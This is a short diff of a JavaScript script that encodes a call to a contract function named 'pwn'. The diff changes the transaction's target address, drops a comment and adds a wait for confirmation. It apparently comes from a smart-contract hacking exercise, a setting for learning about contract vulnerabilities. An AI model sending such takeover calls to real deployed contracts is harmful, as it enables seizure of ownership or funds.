@@ -37,12 +37,12 @@ async function handleReal() {
 
   const encodedData = iface.encodeFunctionData("pwn");
 
-  await me.sendTransaction({
-    to: "0x271cd08b996C40A96b02ceF788E1479ef2850a1D",
+  const tx = await me.sendTransaction({
+    to: "0x343c8200465714D0A04029D9f5837Fa6C1b39f98",
     data: encodedData,
-    // Raised gasLimit for the transaction to go through in the second contract, I think
     gasLimit: 100000,
   });
+  await tx.wait();
 }
 
 // handleTest().catch((error) => {
